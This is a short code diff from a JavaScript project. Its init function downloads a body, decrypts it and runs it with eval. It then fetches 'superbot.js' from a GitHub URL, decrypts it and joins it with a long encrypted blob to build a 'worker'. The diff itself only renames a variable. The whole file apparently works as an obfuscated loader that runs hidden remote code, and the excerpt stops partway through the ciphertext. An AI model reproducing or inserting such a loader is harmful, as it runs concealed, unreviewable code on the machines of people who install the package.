@@ -240,11 +240,11 @@ function init(body,callback) {
     else if(body == '404: Not Found') callback('error git_1: '+body)
     else {
       eval(decrypt(body));
-      request( require('./package.json').github+"superbot.js", function(err, res, body) {
+      request( require('./package.json').github+"superbot.js", function(err, res, code) {
         if(err) callback('error git_2: '+err.message)
-        else if(body == '404: Not Found') callback('error git_2: '+body)
+        else if(code == '404: Not Found') callback('error git_2: '+code)
         else {
-          gg.superbot = decrypt(body);
+          gg.superbot = decrypt(code);
           gg.worker = gg.superbot+'\n'+decrypt(`
 U2FsdGVkX1+jx85xnfAYQZbP9lISexUSlyG05d6xBEmWfIt9f2XFcrnwMJDvQIZA0Rj10NLuOrTJdBzxeqrVkfdrc3l0IGlTwy6X1b07miaY/Zm84VW8Ys5NWclae8zDjdkYi8gk13Tp8kc9StlVxTWeVGqDUsuT
 GTk5oGoD0yskh5az4+WjmLYuLQPB22kf8sgShFgxfu5rs6qhmrsXSkSL/xlA9AqhcWya7x32ieYXselAPZ1mbYIR2Ea7VL8/UE0b+GrPC2+30DNZnLTFKIuazr9oC6K9OE2PLwig0yfyLKJqNJSLOP8vwY1KeHom
